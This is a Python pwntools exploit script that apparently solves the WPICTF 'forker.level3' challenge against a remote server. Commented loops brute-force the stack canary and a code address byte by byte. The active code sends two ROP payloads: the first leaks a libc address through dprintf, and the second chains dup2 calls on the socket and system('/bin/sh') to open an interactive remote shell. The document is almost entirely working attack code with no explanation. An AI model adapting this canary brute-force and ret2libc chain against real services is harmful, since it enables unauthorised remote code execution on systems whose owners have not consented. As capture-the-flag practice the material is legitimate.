from pwn import *

target = ELF('forker.level3')
libc = ELF('libc-2.26.so')

context.log_level = 'debug'

# base_payload = '\x00' * 0x48

# for i in xrange(8):
# 	for j in xrange(0x100):
# 		if j == 0x0a:
# 			continue

# 		r = remote('forker3.wpictf.xyz', 31337)

# 		payload = base_payload + chr(j)
# 		r.sendlineafter('Password:', payload)
# 		try:
# 			r.recvuntil('You failed to get a correct password!')
# 		except EOFError:
# 			pass
# 		else:
# 			break
# 		finally:
# 			r.close()
# 	base_payload += chr(j)

CANARY = '\x00\x3d\x9c\x98\x4d\x99\x80\xb4'
base_payload = '\x00' * 0x48 + CANARY



# base_payload = base_payload.ljust(0x60, '\x00')
# base_payload += p64(4)
# base_payload += p64(0)
# base_payload += p64(0)
# base_payload += '\xf1\x89\xe0\x01\xd1\x55'


# for i in xrange(2):
# 	for j in xrange(0x00, 0x100):
# 		if j == 0x0a:
# 			continue

# 		r = remote('forker3.wpictf.xyz', 31337)

# 		payload = base_payload + chr(j)
# 		r.sendlineafter('Password:', payload)
# 		try:
# 			r.recvuntil('You failed to get a correct password!')
# 		except EOFError:
# 			pass
# 		else:
# 			break
# 		finally:
# 			r.close()
# 	base_payload += chr(j)



TEXT_BASE = u64('\xf1\x89\xe0\x01\xd1\x55\x00\x00') - 0x9f1
OFFSET_POP_RDI = 0xc93
OFFSET_POP_RSI_R15 = 0xc91

r = remote('forker3.wpictf.xyz', 31337)

fd = 4

payload = ''
payload += base_payload.ljust(0x78, '\x00')
payload += p64(TEXT_BASE + OFFSET_POP_RDI)
payload += p64(fd)
payload += p64(TEXT_BASE + OFFSET_POP_RSI_R15)
payload += p64(TEXT_BASE + target.got['dprintf'])
payload += p64(0)
payload += p64(TEXT_BASE + target.plt['dprintf'])

r.sendlineafter('Password:', payload)

LIBC_BASE = u64(r.recv(6) + '\x00\x00') - libc.symbols['dprintf']
OFFSET_BIN_SH = 0x1a3f20

r.close()



r = remote('forker3.wpictf.xyz', 31337)

fd = 4

payload = ''
payload += base_payload.ljust(0x78, '\x00')
payload += p64(TEXT_BASE + OFFSET_POP_RDI)
payload += p64(fd)
payload += p64(TEXT_BASE + OFFSET_POP_RSI_R15)
payload += p64(0)
payload += p64(0)
payload += p64(LIBC_BASE + libc.symbols['dup2'])
payload += p64(TEXT_BASE + OFFSET_POP_RDI)
payload += p64(fd)
payload += p64(TEXT_BASE + OFFSET_POP_RSI_R15)
payload += p64(1)
payload += p64(0)
payload += p64(LIBC_BASE + libc.symbols['dup2'])
payload += p64(TEXT_BASE + OFFSET_POP_RDI)
payload += p64(fd)
payload += p64(TEXT_BASE + OFFSET_POP_RSI_R15)
payload += p64(2)
payload += p64(0)
payload += p64(LIBC_BASE + libc.symbols['dup2'])
payload += p64(TEXT_BASE + OFFSET_POP_RDI)
payload += p64(LIBC_BASE + OFFSET_BIN_SH)
payload += p64(LIBC_BASE + libc.symbols['system'])

r.sendlineafter('Password:', payload)

r.interactive()
